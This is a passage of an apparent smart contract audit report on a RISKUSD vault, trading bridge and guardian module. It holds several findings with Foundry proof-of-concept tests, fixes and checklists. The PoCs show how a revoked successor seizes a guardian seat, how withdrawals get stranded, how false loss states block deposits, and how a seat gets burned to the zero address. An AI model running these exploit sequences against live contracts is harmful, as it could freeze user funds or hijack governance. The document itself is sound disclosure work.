    function setGuardianModule(address guardianModule_) external {
        guardianModule = guardianModule_;
    }
}

contract POC_TargetPausable {
    bool public paused;

    function pause() external {
        paused = true;
    }
}

/**
 * @title POC: Revoked accelerated guardian-seat rotation still executes
 * @notice Proof Statement: Proves that once an accelerated guardian-seat rotation reaches readiness,
 * governance can overwrite `preCommittedSuccessor` to a different address and the old operation still
 * executes. The revoked successor becomes the live guardian, inherits the outgoing guardian's pause
 * permission, and can immediately pause a whitelisted target even though the registry now points
 * somewhere else.
 */
contract POC_GuardianModule_6cdad6b5 is Test {
    GuardianModule internal guardianModule;
    POC_TargetGovernor internal governor;
    POC_TargetPausable internal pausableTarget;

    address internal timelock = makeAddr("timelock");
    address[7] internal guardians;

    function setUp() public {
        governor = new POC_TargetGovernor();

        address[] memory initialGuardians = new address[](7);
        uint256[] memory permissions = new uint256[](7);
        for (uint256 i; i < 7; ++i) {
            guardians[i] = makeAddr(string.concat("guardian-", vm.toString(i)));
            initialGuardians[i] = guardians[i];
            permissions[i] = 1 << 0;
        }

        GuardianModule implementation = new GuardianModule();
        bytes memory initData =
            abi.encodeCall(GuardianModule.initialize, (address(governor), timelock, initialGuardians, permissions));
        guardianModule = GuardianModule(address(new ERC1967Proxy(address(implementation), initData)));
        governor.setGuardianModule(address(guardianModule));

        pausableTarget = new POC_TargetPausable();

        vm.prank(timelock);
        guardianModule.setPausableTarget(address(pausableTarget), true);
    }

    function test_revokedSuccessorStillInheritsGuardianSeatAndCanPause() public {
        bytes32 guardianSeatSlot = guardianModule.SLOT_GUARDIAN_SEAT();
        address staleSuccessor = makeAddr("stale-successor");
        address freshSuccessor = makeAddr("fresh-successor");

        vm.prank(timelock);
        guardianModule.setPreCommittedSuccessor(guardianSeatSlot, guardians[6], staleSuccessor);

        vm.prank(guardians[0]);
        bytes32 operationId = guardianModule.proposeAcceleratedRotation(guardianSeatSlot, guardians[6], staleSuccessor);

        for (uint256 i; i < 4; ++i) {
            vm.prank(guardians[i]);
            guardianModule.approveAcceleratedRotation(operationId);
        }

        vm.prank(timelock);
        guardianModule.setPreCommittedSuccessor(guardianSeatSlot, guardians[6], freshSuccessor);

        assertEq(
            guardianModule.preCommittedSuccessor(guardianSeatSlot, guardians[6]),
            freshSuccessor,
            "registry overwrite should record the replacement successor"
        );

        vm.warp(guardianModule.acceleratedRotationReadyAt(operationId));
        guardianModule.executeAcceleratedRotation(operationId);

        assertEq(guardianModule.guardianAt(6), staleSuccessor, "stale successor should still take the guardian seat");
        assertTrue(
            guardianModule.hasPermission(staleSuccessor, guardianModule.PERMISSION_CAN_PAUSE()),
            "stale successor should inherit the outgoing guardian permission bitmask"
        );
        assertFalse(
            guardianModule.hasPermission(freshSuccessor, guardianModule.PERMISSION_CAN_PAUSE()),
            "replacement successor should not gain authority just because the registry was updated"
        );

        vm.prank(staleSuccessor);
        guardianModule.guardianPause(address(pausableTarget));

        assertTrue(pausableTarget.paused(), "revoked successor should still be able to use inherited guardian power");
    }
}
```

#### Recommendation

Require accelerated execution to re-validate the current trust boundary at execution time:

```solidity
function executeAcceleratedRotation(bytes32 operationId) external {
    Rotation storage rotation = _rotations[operationId];
    if (rotation.readyAt == 0 || block.timestamp < rotation.readyAt || rotation.executed) {
        revert RotationNotReady();
    }
    if (preCommittedSuccessor[rotation.slot][rotation.current] != rotation.successor) revert SuccessorNotPreCommitted();
    if (activeSlotHolder[rotation.slot] != rotation.current) revert RotationNotReady();
    if (block.timestamp > rotation.proposedAt + PROPOSAL_EXPIRY) revert ProposalExpired();
    ...
}
```

Also add an explicit cancellation path and clear `_rotations` / approval state when the timelock overwrites `preCommittedSuccessor` or upgrades the module.

Fix checklist:

- [ ] Re-check `preCommittedSuccessor[rotation.slot][rotation.current]` during `executeAcceleratedRotation()`.
- [ ] Require `activeSlotHolder[rotation.slot] == rotation.current` before executing a rotation.
- [ ] Reject accelerated rotations once `block.timestamp` exceeds `rotation.proposedAt + PROPOSAL_EXPIRY`.
- [ ] Clear or invalidate matching `_rotations` and approval state when `setPreCommittedSuccessor()` overwrites a successor entry.

#### Assumptions

- [x] The targeted seat remains an active guardian seat at execution time.
- [x] The stale successor address is controlled by an attacker or has become untrusted after the original pre-commit.
- [x] Four guardians were able to approve the accelerated rotation before the successor was revoked.

#### Predicted Invalid Reasons

- "Governance can simply change `preCommittedSuccessor` or avoid executing the old operation."
- "Updating `preCommittedSuccessor` was never meant to cancel an already-approved operation."
- "Once four guardians approve the accelerated rotation, the operation is intentionally fixed."

<a id="finding-open-72"></a>
### OPEN-72 — NAV posted after arrival reconciliation but before principal settlement double-subtracts the same returned cash

#### Summary

`HLTradingBridge` lets the keeper reconcile returned USDC, post a custody-only `rawNav`, and later let the executor settle the same principal. `RISKUSDVault._recordCustodianNAV()` resets attestation deltas, and `returnCapital()` then increments `_returnedSinceLastAttestation` again, so the same returned cash is counted twice across the bridge and vault ledgers. This can leave the vault in a false `lossPending()` state that blocks deposits and redemptions until another NAV post repairs the accounting.

#### Context Files

##### HLTradingBridge.reconcileWithdrawalArrival excerpt

Path: `src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function reconcileWithdrawalArrival(bytes32 intentId, uint256 arrivedAmount) external nonReentrant {
    ...
    _reconciledReturnLiquidity += arrivedAmount;
    intent.consumed = true;
    _openWithdrawalIntentId = bytes32(0);
}
```

##### HLTradingBridge.postNAV excerpt

Path: `src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
uint256 applied = rawNav > maxUp ? maxUp : rawNav;
_appliedNAV = applied;
if (_pendingDeployPrincipal != 0 && applied >= _deployedPrincipal) {
    _pendingDeployPrincipal = 0;
}
IRISKUSDVaultNAVPort(riskusdVault).recordCustodianNAV(vaultId, applied, 0);
```

##### RISKUSDVault._recordCustodianNAV excerpt

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
_lastAttestedNAV = nav;
_lastAttestationTimestamp = block.timestamp;
_deployedSinceLastAttestation = 0;
_returnedSinceLastAttestation = 0;
```

##### RISKUSDVault.returnCapital excerpt

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
_totalDeployed -= usdcAmount;
_returnedSinceLastAttestation += usdcAmount;
```

##### RISKUSDVault.adjustedCustodianNAV excerpt

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
uint256 nav = _lastAttestedNAV + _deployedSinceLastAttestation;
if (_returnedSinceLastAttestation >= nav) return 0;
return nav - _returnedSinceLastAttestation;
```

#### Proof of Concept

Foundry PoC in `HLTradingBridge_TargetCustody`: reconcile a `1_000e6` withdrawal arrival, post a custody-only NAV before settlement, then settle the principal with `returnPrincipalUSDC(1_000e6)`. After settlement, `lossPending()` stays true, `solvencyBackingAssets()` does not recover, and a fresh deposit reverts even though vault USDC plus the remaining custody NAV still equals total supply.

##### POC_HLTradingBridge.target_a4106934.t.sol

Path: `test/hyperliquid/POC_HLTradingBridge.target_a4106934.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./HLTradingBridge.target.t.sol";

/**
 * @title POC: NAV posted after reconciliation and before principal settlement double-counts returned cash
 * @notice Proof Statement: Prove that if the keeper posts a custody-only NAV after a withdrawal arrival is
 *         reconciled but before the executor settles that principal with `returnPrincipalUSDC`, the vault
 *         treats the same returned cash as both a lower attested NAV and a later `returnedSinceLastAttestation`
 *         debit. After the principal is fully returned to the vault, `lossPending()` remains true and fresh
 *         deposits revert even though vault USDC plus the remaining custody NAV still equals total RISKUSD supply.
 */
contract POC_HLTradingBridge_target_a4106934 is HLTradingBridge_TargetCustody {
    address internal freshDepositor = makeAddr("fresh-depositor");

    function test_POC_navBeforePrincipalSettlementLeavesFalseLossPending() public {
        vm.prank(executor);
        bridge.deployToHyperLiquid(20_000e6);

        vm.prank(executor);
        bytes32 intentId =
            bridge.requestWithdrawalIntent(1_000e6, address(bridge), sourceAccount, WITHDRAWAL_CHAIN_SELECTOR);

        usdc.mint(address(bridge), 1_000e6);
        vm.prank(keeper);
        bridge.reconcileWithdrawalArrival(intentId, 1_000e6);

        vm.prank(keeper);
        bridge.postNAV(VAULT_ID, 20_000e6, 19_000e6, block.timestamp);

        uint256 backingAfterCustodyOnlyNAV = riskusdVault.solvencyBackingAssets();
        assertTrue(
            riskusdVault.lossPending(), "custody-only NAV marks a shortfall while returned cash sits on bridge"
        );

        vm.prank(executor);
        bridge.returnPrincipalUSDC(1_000e6);

        uint256 actualAssets = usdc.balanceOf(address(riskusdVault)) + bridge.lastNAVRawValue();

        assertEq(actualAssets, riskusd.totalSupply(), "vault cash plus remaining custody value stay fully backed");
        assertEq(
            riskusdVault.solvencyBackingAssets(),
            backingAfterCustodyOnlyNAV,
            "settling principal does not repair the ordering-induced shortfall"
        );
        assertEq(
            riskusdVault.returnedSinceLastAttestation(),
            1_000e6,
            "returned principal is tracked again after the lower NAV is already recorded"
        );
        assertTrue(riskusdVault.lossPending(), "false shortfall persists after principal is settled");

        usdc.mint(freshDepositor, 1e6);
        vm.startPrank(freshDepositor);
        usdc.approve(address(riskusdVault), 1e6);
        vm.expectRevert(RISKUSDVault.LossPending.selector);
        riskusdVault.deposit(1e6);
        vm.stopPrank();
    }
}
```

#### Recommendation

Serialize these state transitions so the vault cannot subtract the same returned cash from NAV twice.

Preferred fix options:

```solidity
// Option A: block NAV posting while reconciled bridge liquidity is still unsettled
require(_reconciledReturnLiquidity == 0, "settle returns before NAV");
```

or explicitly feed bridge-held reconciled principal into the NAV side before resetting the vault deltas, so `rawNav` and `returnedSinceLastAttestation` cannot represent the same cash independently.

#### Assumptions

- [x] `rawNav` excludes bridge-held reconciled cash until the executor settles it into the vault.
- [x] The keeper can call `postNAV()` in the window after `reconcileWithdrawalArrival()` and before `returnPrincipalUSDC()`.

#### Predicted Invalid Reasons

- `The keeper is expected either to include bridge-held returned cash in `rawNav` or to avoid posting NAV until the executor settles the return.`

<a id="finding-open-92"></a>
### OPEN-92 — Global RISKUSD pause bricks atRISKUSD's advertised paused-withdrawal exit path

#### Summary

`atRISKUSD` documents `executeWithdrawal()` as a pause-bypassing exit path, but the payout is a real `RISKUSD` transfer from the tier vault. If `RISKUSD` is globally paused and the tier vault is not transfer-exempt, the final `safeTransfer` reverts with `EnforcedPause`, stranding matured withdrawals. The existing tests use `MockRISKUSD`, so they never exercise the production sender-side pause gate.

#### Context Files

##### atRISKUSD withdrawal path

Path: `openforage_smart_contracts/src/atRISKUSD.sol`
Highlight lines: 13

```solidity
function executeWithdrawal(uint256 minAmountOut) external nonReentrant {
    _executeWithdrawal(minAmountOut);
}

function _executeWithdrawal(uint256 minAmountOut) private {
    PendingWithdrawal storage pw = _pendingWithdrawals[msg.sender];
    if (!pw.active) revert NoPendingWithdrawal();
    _requireNoLossPending();
    ...
    _burn(address(this), sharesToBurn);
    _decreaseLegitimateAssets(riskusdToTransfer);
    _assertBackingPerShareNotDecreased(backingPerShareBefore);
    IERC20(asset()).safeTransfer(msg.sender, riskusdToTransfer);
    emit WithdrawalExecuted(msg.sender, riskusdToTransfer);
}
```

##### RISKUSD pause gate

Path: `openforage_smart_contracts/src/RISKUSD.sol`
Highlight lines: 7

```solidity
function setTransferExempt(address account, bool exempt) external onlyOwner {
    if (account == address(0)) revert ZeroAddress();
    _transferExempt[account] = exempt;
    ...
}

function _update(address from, address to, uint256 value) internal override {
    if (from != address(0) && to != address(0)) {
        if (paused() && !_transferExempt[from]) {
            revert EnforcedPause();
        }
    }
    ...
    super._update(from, to, value);
}
```

##### AtRISKUSDTestBase mock wiring

Path: `openforage_smart_contracts/test/helpers/AtRISKUSDTestBase.sol`
Highlight lines: 1

```text
`AtRISKUSDTestBase` wires the vault against `MockRISKUSD`, not the real token (`test/helpers/AtRISKUSDTestBase.sol:14-18`, `test/helpers/AtRISKUSDTestBase.sol:34-69`). That mock only applies its `mockPaused` flag to `mint()` and `burn()`; it does not override transfers at all (`test/mocks/MockRISKUSD.sol:6-45`).
```

##### Pause regression coverage gap

Path: `openforage_smart_contracts/test/atRISKUSD.pause.t.sol`
Highlight lines: 1

```text
`test_TC13_pauseDoesNotBlockExecuteWithdrawal()` pauses only the tier vault and asserts that `executeWithdrawal()` succeeds; it never combines a real `RISKUSD` pause with a real mature pending withdrawal.
```

#### Proof of Concept

Run the focused Foundry test from the repository root. It deploys proxied `RISKUSD`, `RISKUSDVault`, `USDCTreasury`, and `atRISKUSD`, requests a withdrawal, waits through cooldown, pauses both the tier vault and `RISKUSD`, and then shows that `executeWithdrawal()` reverts with `EnforcedPause` while the pending withdrawal remains active.

##### Focused PoC command

Path: `openforage_smart_contracts`

```bash
cd openforage_smart_contracts
forge test --match-path test/POC_atRISKUSD.pause_4b2d4e7a.t.sol -vv
```

##### POC_atRISKUSD_GlobalPause_4b2d4e7a

Path: `test/POC_atRISKUSD.pause_4b2d4e7a.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";

import "../src/RISKUSD.sol";
import "../src/RISKUSDVault.sol";
import "../src/USDCTreasury.sol";
import "../src/atRISKUSD.sol";

/**
 * @title POC: Global RISKUSD Pause Bricks Mature atRISKUSD Withdrawals
 * @notice Proof Statement: Proves that a user with a fully matured pending atRISKUSD withdrawal
 * cannot execute it once RISKUSD itself is paused, even though atRISKUSD intentionally leaves
 * executeWithdrawal() callable during pause. The call reverts because RISKUSD enforces pause on
 * the non-exempt sender `atRISKUSD`, leaving the pending withdrawal stranded.
 */
contract POC_atRISKUSD_GlobalPause_4b2d4e7a is Test {
    uint256 internal constant DEPOSIT_AMOUNT = 1_000e6;
    uint256 internal constant COOLDOWN_PERIOD = 7 days;

    address internal owner = makeAddr("owner");
    address internal stakingQueue = makeAddr("stakingQueue");
    address internal alice = makeAddr("alice");
    address internal dummyUsdc = makeAddr("dummyUsdc");
    address internal dummyVaultRegistry = makeAddr("dummyVaultRegistry");
    address internal foundationPrimary = makeAddr("foundationPrimary");
    address internal foundationBackup = makeAddr("foundationBackup");
    address internal protocolPrimary = makeAddr("protocolPrimary");
    address internal protocolBackup = makeAddr("protocolBackup");

    RISKUSD internal riskusd;
    RISKUSDVault internal riskusdVault;
    USDCTreasury internal treasury;
    atRISKUSD internal tierVault;

    function setUp() public {
        riskusd = RISKUSD(
            address(new ERC1967Proxy(address(new RISKUSD()), abi.encodeCall(RISKUSD.initialize, (owner))))
        );

        riskusdVault = RISKUSDVault(
            address(
                new ERC1967Proxy(
                    address(new RISKUSDVault()),
                    abi.encodeCall(RISKUSDVault.initialize, (dummyUsdc, address(riskusd), owner))
                )
            )
        );

        treasury = USDCTreasury(
            address(
                new ERC1967Proxy(
                    address(new USDCTreasury()),
                    abi.encodeCall(
                        USDCTreasury.initialize,
                        (
                            dummyUsdc,
                            address(riskusdVault),
                            dummyVaultRegistry,
                            owner,
                            foundationPrimary,
                            foundationBackup,
                            protocolPrimary,
                            protocolBackup
                        )
                    )
                )
            )
        );

        tierVault = atRISKUSD(
            address(
                new ERC1967Proxy(
                    address(new atRISKUSD()),
                    abi.encodeCall(
                        atRISKUSD.initialize,
                        (address(riskusd), address(treasury), stakingQueue, 0, COOLDOWN_PERIOD, 0, "T0", owner)
                    )
                )
            )
        );

        vm.prank(owner);
        tierVault.setWeeklyWithdrawalCapBps(10_000);

        vm.prank(owner);
        riskusd.setMinter(owner);

        vm.warp(block.timestamp + riskusd.FINALIZE_DELAY());

        vm.prank(owner);
        riskusd.finalizeMinter();

        vm.prank(owner);
        riskusd.mint(stakingQueue, DEPOSIT_AMOUNT);

        vm.startPrank(stakingQueue);
        riskusd.approve(address(tierVault), DEPOSIT_AMOUNT);
        tierVault.deposit(DEPOSIT_AMOUNT, alice);
        vm.stopPrank();
    }

    function test_globalRiskusdPauseBricksMaturePausedExecuteWithdrawal() public {
        uint256 shares = tierVault.balanceOf(alice);

        vm.prank(alice);
        tierVault.requestWithdrawal(shares);

        vm.warp(block.timestamp + COOLDOWN_PERIOD);

        assertFalse(riskusd.isTransferExempt(address(tierVault)), "tier vault unexpectedly exempt");

        vm.startPrank(owner);
        tierVault.pause();
        riskusd.pause();
        vm.stopPrank();

        atRISKUSD.PendingWithdrawal memory pendingBefore = tierVault.pendingWithdrawal(alice);
        uint256 aliceRiskusdBefore = riskusd.balanceOf(alice);

        assertTrue(pendingBefore.active, "pending withdrawal should exist before execution");
        assertEq(riskusd.balanceOf(address(tierVault)), DEPOSIT_AMOUNT, "underlying should sit in the tier vault");

        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(PausableUpgradeable.EnforcedPause.selector));
        tierVault.executeWithdrawal();

        atRISKUSD.PendingWithdrawal memory pendingAfter = tierVault.pendingWithdrawal(alice);
        assertTrue(tierVault.paused(), "tier vault should be paused");
        assertTrue(riskusd.paused(), "RISKUSD should be paused");
        assertTrue(pendingAfter.active, "revert should strand the pending withdrawal");
        assertEq(pendingAfter.atriskusdAmount, pendingBefore.atriskusdAmount, "share claim should remain locked");
        assertEq(pendingAfter.riskusdAmount, pendingBefore.riskusdAmount, "RISKUSD claim should remain pending");
        assertEq(riskusd.balanceOf(alice), aliceRiskusdBefore, "alice should receive no RISKUSD");
        assertEq(riskusd.balanceOf(address(tierVault)), DEPOSIT_AMOUNT, "underlying remains stuck in the tier vault");
    }
}
```

#### Recommendation

Make the boundary explicit in code. Either:
1. Deliberately support this exit path by adding a tightly-scoped, documented exemption mechanism for tier vaults; or
2. Reject execution up front when the underlying `RISKUSD` is paused, so the failure mode is explicit and operators are not relying on a non-existent emergency exit path.

#### Assumptions

- [x] A real emergency pause uses the production `RISKUSD.pause()` path.
- [x] The tier vault has not been separately marked transfer-exempt in `RISKUSD`.
- [x] The protocol expects the documented paused-withdrawal path to remain available under emergency conditions.

#### Predicted Invalid Reasons

- "The guarantee only covers the tier vault being paused. A `RISKUSD` pause is a stronger emergency mode that is supposed to stop claim-token movement."

<a id="low"></a>
## Low

<a id="finding-open-96"></a>
### OPEN-96 — Accelerated guardian rotation accepts the default zero successor and irreversibly burns honest seats

#### Summary

`proposeAcceleratedRotation()` only checks `preCommittedSuccessor[slot][current] == successor`, so an unset registry entry can authorize `successor = address(0)`. If four guardians approve a guardian-seat rotation, `executeAcceleratedRotation()` can write `address(0)` into `_guardianList` and clear the victim guardian's permissions, leaving a corrupted zero entry that the normal zero-address-checked admin flows cannot clean up.

#### Context Files

##### GuardianModule precommit and proposal checks

Path: `openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 3, 9

```solidity
function setPreCommittedSuccessor(bytes32 slot, address current, address successor) external {
    if (msg.sender != timelock) revert Unauthorized();
    if (slot == bytes32(0) || current == address(0) || successor == address(0)) revert ZeroAddress();
    preCommittedSuccessor[slot][current] = successor;
}

function proposeAcceleratedRotation(bytes32 slot, address current, address successor) external returns (bytes32) {
    _requireGuardian(msg.sender);
    if (preCommittedSuccessor[slot][current] != successor) revert SuccessorNotPreCommitted();
    bytes32 operationId = keccak256(abi.encode("accelerated", slot, current, successor));
    ...
}
```

##### GuardianModule accelerated rotation execution

Path: `openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 4, 10, 11

```solidity
function executeAcceleratedRotation(bytes32 operationId) external {
    Rotation storage rotation = _rotations[operationId];
    ...
    if (rotation.slot == SLOT_GUARDIAN_SEAT) {
        _replaceGuardianSeat(rotation.current, rotation.successor);
    }
}

function _replaceGuardianSeat(address current, address successor) internal {
    uint256 permissions = guardianPermissions[current];
    if (permissions == 0) revert NotGuardian();
    for (uint256 i; i < _guardianList.length;) {
        if (_guardianList[i] == current) {
            _guardianList[i] = successor;
            guardianPermissions[successor] = permissions;
            guardianPermissions[current] = 0;
            ...
        }
    }
}
```

#### Proof of Concept

Save the PoC as `test/POC_GuardianModule_zeroSuccessor_e518dd02.t.sol`, then run `forge test --match-path test/POC_GuardianModule_zeroSuccessor_e518dd02.t.sol --match-test test_poc_zeroSuccessorBurnsSeatButDoesNotPreventFunctionalRecovery -vv`. The test proposes `proposeAcceleratedRotation(SLOT_GUARDIAN_SEAT, burnedGuardian, address(0))`, collects four approvals, executes the rotation, and then shows `guardianAt(6) == address(0)`, `guardianPermissions[address(0)] == burnedPermissions`, `removeGuardian(address(0))` reverts, and `setGuardianPermissions(replacement, burnedPermissions)` restores a callable guardian.

##### POC_GuardianModule_zeroSuccessor_e518dd02.t.sol

Path: `test/POC_GuardianModule_zeroSuccessor_e518dd02.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./GuardianModule.target.t.sol";

/**
 * @title POC: Accelerated guardian rotation accepts the default zero successor
 * @notice Proof Statement: Proves that four guardians can accelerate a guardian-seat rotation to
 * `address(0)` without any timelock-set successor because `preCommittedSuccessor[slot][current]`
 * defaults to zero. Execution writes `address(0)` into the guardian list and transfers the burned
 * guardian's permissions to `guardianPermissions[address(0)]`. The test also proves the resulting
 * zero entry is not directly removable through `removeGuardian(address(0))`, but governance can
 * still restore a callable guardian by adding a new nonzero guardian via `setGuardianPermissions`.
 */
contract POC_GuardianModule_zeroSuccessor_e518dd02 is GuardianModule_TargetRecovery {
    function test_poc_zeroSuccessorBurnsSeatButDoesNotPreventFunctionalRecovery() public {
        bytes32 guardianSeatSlot = guardianModule.SLOT_GUARDIAN_SEAT();
        address burnedGuardian = guardians[6];
        uint256 burnedPermissions = guardianModule.guardianPermissions(burnedGuardian);

        assertEq(
            guardianModule.preCommittedSuccessor(guardianSeatSlot, burnedGuardian),
            address(0),
            "baseline: no successor is pre-committed"
        );

        vm.prank(guardians[0]);
        bytes32 operationId = guardianModule.proposeAcceleratedRotation(guardianSeatSlot, burnedGuardian, address(0));

        for (uint256 i; i < 4; ++i) {
            vm.prank(guardians[i]);
            guardianModule.approveAcceleratedRotation(operationId);
        }

        vm.warp(guardianModule.acceleratedRotationReadyAt(operationId));
        guardianModule.executeAcceleratedRotation(operationId);

        assertEq(guardianModule.guardianAt(6), address(0), "guardian list now contains a zero entry");
        assertEq(guardianModule.guardianCount(), 7, "rotation preserves raw list length");
        assertEq(guardianModule.guardianPermissions(burnedGuardian), 0, "burned guardian loses permissions");
        assertEq(
            guardianModule.guardianPermissions(address(0)),
            burnedPermissions,
            "zero address inherits the burned guardian permissions"
        );
        assertEq(guardianModule.activeSlotHolder(guardianSeatSlot), address(0), "slot holder is now zero");

        vm.expectRevert(GuardianModule.ZeroAddress.selector);
        vm.prank(timelock);
        guardianModule.removeGuardian(address(0));

        address replacement = makeAddr("replacement-guardian");
        vm.prank(timelock);
        guardianModule.setGuardianPermissions(replacement, burnedPermissions);

        assertTrue(guardianModule.isGuardian(replacement), "timelock can still add a callable replacement guardian");
        assertEq(guardianModule.guardianPermissions(replacement), burnedPermissions, "replacement receives permissions");
        assertEq(guardianModule.guardianCount(), 8, "recovery adds a new guardian but cannot remove the zero entry");
    }
}

```

#### Recommendation

Reject zero-valued accelerated/routine rotation inputs at proposal time and re-check the successor at execution time.

```solidity
function proposeAcceleratedRotation(bytes32 slot, address current, address successor) external returns (bytes32) {
    _requireGuardian(msg.sender);
    if (slot == bytes32(0) || current == address(0) || successor == address(0)) revert ZeroAddress();
    if (preCommittedSuccessor[slot][current] != successor) revert SuccessorNotPreCommitted();
    ...
}

function executeAcceleratedRotation(bytes32 operationId) external {
    Rotation storage rotation = _rotations[operationId];
    if (rotation.successor == address(0)) revert ZeroAddress();
    if (preCommittedSuccessor[rotation.slot][rotation.current] != rotation.successor) revert SuccessorNotPreCommitted();
    ...
}
```

Also add an explicit guard in `_replaceGuardianSeat()` against `successor == address(0)` so future upgrades cannot reintroduce the bug.

Fix checklist:

- [ ] Reject zero `slot`, `current`, and `successor` values in accelerated rotation proposal flows.
- [ ] Reject zero `slot`, `current`, and `successor` values in routine rotation proposal flows.
- [ ] Re-check `preCommittedSuccessor[slot][current]` against the stored successor at execution time before applying the rotation.
- [ ] Add an explicit `successor != address(0)` guard in `_replaceGuardianSeat()`.
- [ ] Add a timelock-only cleanup path that can purge existing zero-address guardian entries from `_guardianList`.

#### Assumptions

- [x] The attacker controls four guardian keys simultaneously.
- [x] Governance has not already removed those four guardians before the 10-minute acceleration window expires.
- [x] Recovery is evaluated against the shipped guardian-management paths, not a bespoke rescue upgrade.
- [x] The targeted `(slot, current)` pair has no populated `preCommittedSuccessor[slot][current]` entry.

#### Predicted Invalid Reasons

- "This only matters if governance forgot to maintain the successor registry, and even then the timelock can add another guardian later, so it is just an admin edge case."

<a id="finding-open-76"></a>
### OPEN-76 — HLTradingBridge cannot execute the vault's nonce-bound loss workflow in production

#### Summary

When `HLTradingBridge` is the vault custodian, `postNAV()` always forwards `lossNonce = 0`, the bridge cannot call `RISKUSDVault.finalizeAttestedLoss(...)`, and it does not implement `normalizeManualCustodianNAV(...)`. Real losses therefore fall back to `burnForLoss()`, which writes down the vault but leaves `HLTradingBridge.deployedPrincipal()` and `CustodianRegistry.deployedByCustodian(...)` stale.

#### Context Files

##### bridge-nav-entrypoint

Path: `src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
interface IRISKUSDVaultNAVPort {
    function recordCustodianNAV(uint256 vaultId, uint256 nav, uint256 lossNonce) external;
}

function postNAV(uint256 vaultId, uint256 bookValue, uint256 rawNav, uint256 observedAt) external {
    ...
    IRISKUSDVaultNAVPort(riskusdVault).recordCustodianNAV(vaultId, applied, 0);
}
```

##### vault-attested-loss-finalization

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function finalizeAttestedLoss(uint256 vaultId, uint256 lossNonce, uint256 amount) external {
    if (msg.sender != _custodian) revert UnauthorizedCustodian();
    ...
}
```

##### vault-manual-normalization-fallback

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
(bool ok, bytes memory data) = custodian_.staticcall(
    abi.encodeCall(IManualCustodianNAVNormalizer.normalizeManualCustodianNAV, (vaultId, nav, lossNonce))
);
if (!ok || data.length < 64) revert ManualAttestationNormalizationFailed(custodian_);
```

##### test-helper-eoa-loss-finalization

Path: `test/helpers/RISKUSDVaultTestBase.sol`
Highlight lines: 1

```solidity
vm.prank(custodianAddr);
vault.recordCustodianNAV(1, 0, lossNonce);
...
vm.prank(custodianAddr);
vault.finalizeAttestedLoss(vaultId, lossNonce, amount);
```

#### Proof of Concept

Create `test/hyperliquid/POC_HLTradingBridge_target_efe58614.t.sol` on the live bridge harness, then:
- deploy `20_000e6` through `bridge.deployToHyperLiquid(...)`;
- post `bridge.postNAV(VAULT_ID, 20_000e6, 19_000e6, block.timestamp)`;
- confirm the vault is only `lossPending()` with `latestLossNonce() == 0`;
- absorb the shortfall with `riskusdVault.burnForLoss(VAULT_ID, 1_000e6)`;
- return the remaining principal and observe `RISKUSDVault.totalDeployed() == 0` while bridge and registry still report `1_000e6` deployed.

##### POC_HLTradingBridge_target_efe58614.t.sol

Path: `test/hyperliquid/POC_HLTradingBridge_target_efe58614.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./HLTradingBridge.target.t.sol";

contract POC_HLTradingBridge_target_efe58614 is HLTradingBridge_TargetCustody {
    /**
     * @notice Proof Statement: Prove that when `HLTradingBridge` is the finalized custodian, a real shortfall posted through
     * `postNAV()` leaves the vault in `lossPending()` with `latestLossNonce() == 0`, so the only runnable resolution is
     * `burnForLoss()`. That burn writes down `RISKUSDVault.totalDeployed()` but leaves `HLTradingBridge.deployedPrincipal()`
     * and `CustodianRegistry.deployedByCustodian(...)` stale; even after all remaining real principal is returned, the
     * bridge and registry still overstate deployed principal by the lost amount.
     */
    function test_POC_liveBridgeLossWriteDownLeavesPermanentCrossLedgerDrift() public {
        bytes32 id = custodianRegistry.HYPERLIQUID_CUSTODIAN_ID();

        vm.prank(executor);
        bridge.deployToHyperLiquid(20_000e6);

        vm.prank(keeper);
        bridge.postNAV(VAULT_ID, 20_000e6, 19_000e6, block.timestamp);

        assertTrue(riskusdVault.lossPending(), "shortfall must be detected");
        assertEq(riskusdVault.lossPendingVaultId(), 0, "bridge postNAV leaves the shortfall unbound");
        assertEq(riskusdVault.latestLossNonce(), 0, "bridge postNAV cannot open an attested loss nonce");
        assertEq(riskusdVault.latestLossAmount(), 0, "bridge postNAV does not record an attested loss amount");
        assertEq(riskusdVault.totalDeployed(), 20_000e6, "low NAV alone does not write down deployed principal");

        vm.prank(vaultDepositor);
        riskusd.transfer(owner, 1_000e6);

        vm.prank(owner);
        riskusdVault.burnForLoss(VAULT_ID, 1_000e6);

        assertFalse(riskusdVault.lossPending(), "burn-only path clears the shortfall");
        assertEq(riskusdVault.totalDeployed(), 19_000e6, "vault writes down the loss locally");
        assertEq(bridge.deployedPrincipal(), 20_000e6, "bridge deployed principal remains pre-loss");
        assertEq(custodianRegistry.deployedByCustodian(id), 20_000e6, "registry deployed exposure remains pre-loss");

        uint256 remaining = 19_000e6;
        uint256 steps;
        while (remaining != 0) {
            ++steps;
            assertLt(steps, 64);

            uint256 amount = bridge.deployedPrincipal() / 10;
            if (amount > remaining) amount = remaining;

            vm.prank(executor);
            bytes32 intentId =
                bridge.requestWithdrawalIntent(amount, address(bridge), sourceAccount, WITHDRAWAL_CHAIN_SELECTOR);
            usdc.mint(address(bridge), amount);
            vm.prank(keeper);
            bridge.reconcileWithdrawalArrival(intentId, amount);

            vm.prank(executor);
            bridge.returnPrincipalUSDC(amount);

            remaining -= amount;
            if (remaining != 0) vm.warp(block.timestamp + 1 days + 1);
        }

        assertEq(riskusdVault.totalDeployed(), 0, "all real principal is back in the vault");
